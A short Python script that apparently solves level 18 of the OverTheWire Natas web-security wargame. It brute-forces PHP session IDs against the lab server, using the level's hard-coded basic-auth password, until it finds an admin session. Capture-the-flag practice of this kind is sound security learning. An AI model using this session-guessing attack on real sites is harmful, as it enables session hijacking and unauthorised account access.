import requests
import string
from requests.auth import HTTPBasicAuth

# debug=true to get the complete query string in the result
url = 'http://natas18.natas.labs.overthewire.org/index.php'
response = ''
# base auth
auth = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

# try out all possible session ids
for id in range(0, 640):
    print(id)
    cookies = {'PHPSESSID': str(id)}
    x = requests.post(url, auth = auth, cookies = cookies)
    response = x.text
    if("next level" in response):
        print response
        break
